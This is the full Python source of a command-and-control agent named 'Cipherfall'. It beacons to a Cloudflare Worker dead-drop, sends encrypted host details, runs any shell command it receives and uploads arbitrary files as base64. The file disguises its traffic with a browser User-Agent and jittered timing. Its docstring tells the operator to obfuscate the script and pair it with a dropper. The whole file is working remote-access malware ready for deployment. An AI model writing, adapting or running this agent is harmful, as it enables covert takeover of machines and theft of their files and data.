#!/usr/bin/env python3
"""
agent.py — Cipherfall C2 Agent

Bake WORKER_URL and C2_PSK into the script before deployment, then obfuscate
with Modules/Obfuscator/obfuscator_py.py.

Communication model:
  The agent never connects to the C2 server. It only talks to the Cloudflare
  Worker, which acts as a dead-drop. All traffic is HTTPS on port 443 to a
  Cloudflare edge node; the C2 server's real IP is never involved.

  On each iteration:
    1. PUT /hb/{agent_id}          — heartbeat with encrypted sysinfo
    2. GET /task/{agent_id}        — poll for a pending task
       204 → nothing queued, sleep and repeat
       200 → decrypt task, execute, continue to step 3
    3. PUT /result/{task_id}       — upload encrypted output

Worker authentication:
  All requests carry  Authorization: Bearer <WORKER_TOKEN>.
  WORKER_TOKEN = HMAC-SHA256(PSK, b"worker_token").hexdigest()[:32]
  Derived identically on server and agent from the shared PSK.

Encryption:
  AES-256-GCM. Key = PBKDF2-SHA256(PSK, b"cipherfall_c2_v1", 32, 100 000).
  Wire: base64(nonce[12] ‖ ciphertext ‖ GCM-tag[16]).

Agent identity:
  SHA-256 of /etc/machine-id (fallback: hostname), truncated to 32 hex chars.
  Deterministic and stable across reboots. Print with:  python3 agent.py --id

Supported commands:
  <any shell string>       executed via /bin/sh, stdout+stderr returned
  UPLOAD:/path/to/file     file read in binary mode, returned as base64

Environment variables (bake these before obfuscating):
  WORKER_URL      Cloudflare Worker URL   (required)
  C2_PSK          pre-shared passphrase   (default: changeme)
  C2_INT          base beacon interval s  (default: 30)
  C2_JITTER       ± jitter seconds        (default: 10)

Limitations:
  - Requires pycryptodome and requests.
  - No persistence; must be re-launched after reboot (pair with a dropper).
  - Runs as the deploying user; root required for privileged operations.
  - Output is buffered in memory before upload; avoid unbounded commands.
  - If a task is read but the agent crashes before sending the result, the
    task is irrecoverably lost from the Worker KV (re-queue manually).
"""

import base64, hashlib, hmac as _stdlib_hmac, json, os, platform
import random, subprocess, sys, time
import requests, urllib3
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WORKER_URL = os.environ.get("WORKER_URL", "https://cipherfall-c2.cipherfall-c2.workers.dev/")
PSK        = os.environ.get("C2_PSK",     "CeciEstMonPSK")
BEACON_INT = int(os.environ.get("C2_INT",    "30"))
JITTER     = int(os.environ.get("C2_JITTER", "10"))

_KEY          = PBKDF2(PSK.encode(), b"cipherfall_c2_v1", dkLen=32,
                       count=100_000, hmac_hash_module=SHA256)
_WORKER_TOKEN = _stdlib_hmac.new(
    PSK.encode(), b"worker_token", hashlib.sha256
).hexdigest()[:32]

_SESSION = requests.Session()
_SESSION.headers.update({
    "Authorization": f"Bearer {_WORKER_TOKEN}",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
})


def _agent_id() -> str:
    try:
        with open("/etc/machine-id") as f:
            seed = f.read().strip()
    except OSError:
        seed = platform.node()
    return hashlib.sha256(seed.encode()).hexdigest()[:32]


def _encrypt(obj: dict) -> str:
    nonce = get_random_bytes(12)
    cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(nonce + ct + tag).decode()


def _decrypt(token: str) -> dict:
    raw = base64.b64decode(token)
    nonce, ct, tag = raw[:12], raw[12:-16], raw[-16:]
    cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    return json.loads(cipher.decrypt_and_verify(ct, tag))


def _sysinfo() -> dict:
    return {
        "hostname": platform.node(),
        "os":       platform.system(),
        "release":  platform.release(),
        "user":     os.environ.get("USER") or os.environ.get("USERNAME", "?"),
        "cwd":      os.getcwd(),
    }


def _exec(cmd: str) -> str:
    if cmd.startswith("UPLOAD:"):
        path = cmd[7:]
        try:
            with open(path, "rb") as f:
                return base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"[error: {e}]"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return (r.stdout + r.stderr) or "[no output]"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error: {e}]"


AGENT_ID = _agent_id()


def _beacon():
    hb = _encrypt({"id": AGENT_ID, "ts": int(time.time()), "sysinfo": _sysinfo()})
    _SESSION.put(f"{WORKER_URL}/hb/{AGENT_ID}", data=hb, timeout=15)

    r = _SESSION.get(f"{WORKER_URL}/task/{AGENT_ID}", timeout=15)
    if r.status_code != 200:
        return

    task   = _decrypt(r.text)
    output = _exec(task["cmd"])
    result = _encrypt({"task_id": task["task_id"], "output": output})
    _SESSION.put(f"{WORKER_URL}/result/{task['task_id']}", data=result, timeout=15)


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--id":
        print(AGENT_ID)
        return
    while True:
        try:
            _beacon()
        except Exception:
            pass
        time.sleep(max(1, BEACON_INT + random.randint(-JITTER, JITTER)))


if __name__ == "__main__":
    main()
